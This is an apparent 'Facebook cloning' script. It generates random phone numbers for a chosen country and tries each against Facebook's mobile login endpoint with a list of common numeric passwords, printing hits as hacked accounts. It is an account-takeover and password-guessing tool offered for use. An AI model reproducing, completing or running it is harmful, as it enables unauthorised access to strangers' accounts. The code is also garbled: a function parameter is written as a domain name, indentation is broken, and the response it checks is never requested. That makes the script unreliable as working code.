import random
import requests
import os

def banner():
    os.system("clear")
    print("\033[1;91m")
    print("███████╗ █████╗ ██╗   ██╗███████╗ ██████╗")
    print("██╔════╝██╔══██╗██║   ██║██╔════╝██╔═══██╗")
    print("█████╗  ███████║██║   ██║███████╗██║   ██║")
    print("██╔══╝  ██╔══██║╚██╗ ██╔╝╚════██║██║   ██║")
    print("███████╗██║  ██║ ╚████╔╝ ███████║╚██████╔╝")
    print("╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝ ╚═════╝ ")
    print("\033[1;92m")
    print("       🔥🔥🔥 WELCOME TO FAYEQ TOOL 🔥🔥🔥")
    print("\033[0m")

def generate_numbers(country_code, count):
    return [f"{country_code}{random.randint(1000000, 9999999)}" for _ in range(count)]

countries = {
    "1": ("🇦🇫 Afghanistan", "+93"),
    "2": ("🇵🇰 Pakistan", "+92"),
    "3": ("🇮🇳 India", "+91"),
    "4": ("🇧🇩 Bangladesh", "+880"),
    "5": ("🇺🇸 American", "+1")
}


passwords = [
    "123456", "1234567", "12345678", "123456789", "1234567890",
    "۱۲۳۴۵۶", "۱۲۳۴۵۶۷", "۱۲۳۴۵۶۷۸۹", "۱۲۳۱۲۳", "۱۲۳۴۱۲۳۴",
    "۱۰۰۲۰۰۳۰۰", "123123", "12341234", "10002000", "500600"
]

def main():
    banner()
    print("🔥please choice the country 🔥")
    for key, (name, _) in countries.items():
        print(f"[{key}] {name}")

    choice = input("\nchoice: ")

    if choice in countries:
        country_name, country_code = countries[choice]
        print(f"\nSelect the country: {country_name}")
        print("\nGenerating a random number\n")

        phone_numbers = generate_numbers(country_code, 10)

        print("number Hack")
        for num in phone_numbers[:10]:  
            print(f"   {num}")

        input("\nPress enter to continue...")

        start_cloning(phone_numbers)
    else:
        print("❌ Invalid selection!  Please try again.")
        main()

def start_cloning(free.facebook.com):
    print("\nStarting Cloning...\n")

   for phone in phone_numbers:
    for password in passwords:
        url = "https://mbasic.facebook.com/login/device-based/login/async/"
        
        log_data = {
            "email": phone,
            "pass": password,
            "login": "Log In"
        }

        print(f"Trying {phone} | {password}")

            if "success" in response.text:
                print(f"\033[1;92m[✔] : {phone} | {password}\033[0m")
            else:
                print(f"\033[1;91m[✘] : {phone} | {password}\033[0m")

    print("\n")

if __name__ == "__main__":
    main()